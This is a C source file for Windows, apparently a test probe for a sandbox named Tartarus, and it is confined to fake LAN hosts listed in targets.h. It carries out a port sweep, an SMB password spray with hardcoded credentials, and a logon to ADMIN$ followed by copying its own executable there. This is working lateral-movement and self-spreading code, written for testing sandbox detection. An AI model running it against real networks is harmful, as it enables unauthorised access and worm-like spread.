/*
 * Benign Tartarus fake-LAN probe (Step 12b). Harmless: no persistence, no payload beyond a copy of
 * itself, touches only the addresses in targets.h (the preset's own fake hosts, generated from the API).
 *   1. connect sweep: one TCP connect to every service of every preset host (>= 5 hosts on 445, >= 4 hosts over >= 2 services)
 *   2. credential spray: a wrong Administrator password against every SMB host except the first (parallel threads)
 *   3. one real logon with a weak known account of the preset, then a copy of this exe to \\ip\ADMIN$
 * Progress goes to %TEMP%\lan_probe.log so a run without the fake LAN shows what was refused.
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winnetwk.h>
#include <stdio.h>
#include "targets.h"

#define COUNT(a) ((int)(sizeof(a) / sizeof((a)[0])))
#define CONNECT_TIMEOUT_MS 1500

static FILE *logfile;
static CRITICAL_SECTION log_lock;

static void say(const char *fmt, ...) {
    va_list args;
    EnterCriticalSection(&log_lock);
    SYSTEMTIME t;
    GetLocalTime(&t);
    fprintf(logfile, "%02d:%02d:%02d.%03d ", t.wHour, t.wMinute, t.wSecond, t.wMilliseconds);
    va_start(args, fmt);
    vfprintf(logfile, fmt, args);
    va_end(args);
    fputc('\n', logfile);
    fflush(logfile);
    LeaveCriticalSection(&log_lock);
}

static int tcp_connect(const char *ip, int port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;
    u_long nonblocking = 1;
    ioctlsocket(s, FIONBIO, &nonblocking);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons((u_short)port) };
    inet_pton(AF_INET, ip, &addr.sin_addr);
    connect(s, (struct sockaddr *)&addr, sizeof addr);
    fd_set writable, failed;
    FD_ZERO(&writable); FD_ZERO(&failed);
    FD_SET(s, &writable); FD_SET(s, &failed);
    struct timeval timeout = { 0, CONNECT_TIMEOUT_MS * 1000 };
    int ready = select(0, NULL, &writable, &failed, &timeout);
    int connected = ready > 0 && FD_ISSET(s, &writable);
    closesocket(s);
    return connected;
}

static DWORD logon(const char *ip, const char *share, const char *user, const char *password) {
    char remote[128];
    snprintf(remote, sizeof remote, "\\\\%s\\%s", ip, share);
    NETRESOURCEA resource = { .dwType = RESOURCETYPE_DISK, .lpRemoteName = remote };
    return WNetAddConnection2A(&resource, password, user, 0);
}

struct spray_job { const char *ip; };

static DWORD WINAPI spray_one(LPVOID arg) {
    const char *ip = ((struct spray_job *)arg)->ip;
    DWORD rc = logon(ip, "IPC$", "Administrator", "Winter2020!");
    say("spray %s Administrator/Winter2020! -> %lu", ip, rc);
    if (rc == NO_ERROR) WNetCancelConnectionA(NULL, TRUE);
    return 0;
}

static void sweep(void) {
    for (int i = 0; i < COUNT(SWEEP); i++)
        say("connect %s:%d -> %s", SWEEP[i].ip, SWEEP[i].port, tcp_connect(SWEEP[i].ip, SWEEP[i].port) ? "open" : "no answer");
}

static void spray_and_logon(void) {
    HANDLE threads[16];
    struct spray_job jobs[16];
    int started = 0;
    for (int i = 1; i < COUNT(SMB_HOSTS) && started < 16; i++) {
        jobs[started].ip = SMB_HOSTS[i];
        threads[started] = CreateThread(NULL, 0, spray_one, &jobs[started], 0, NULL);
        started++;
    }
    const char *target = SMB_HOSTS[0];
    DWORD rc = logon(target, "ADMIN$", "Administrator", "Password1");
    say("logon %s ADMIN$ Administrator/Password1 -> %lu", target, rc);
    if (rc == NO_ERROR) {
        char self[MAX_PATH], remote[160];
        GetModuleFileNameA(NULL, self, sizeof self);
        snprintf(remote, sizeof remote, "\\\\%s\\ADMIN$\\tartarus-benign.exe", target);
        BOOL copied = CopyFileA(self, remote, FALSE);
        say("copy self -> %s : %s (error %lu)", remote, copied ? "ok" : "failed", copied ? 0 : GetLastError());
    }
    WaitForMultipleObjects(started, threads, TRUE, 90000);
}

int main(void) {
    char path[MAX_PATH];
    WSADATA wsa;
    InitializeCriticalSection(&log_lock);
    GetTempPathA(sizeof path, path);
    strncat(path, "lan_probe.log", sizeof path - strlen(path) - 1);
    logfile = fopen(path, "w");
    if (!logfile || WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    say("start");
    sweep();
    spray_and_logon();
    say("done");
    return 0;
}
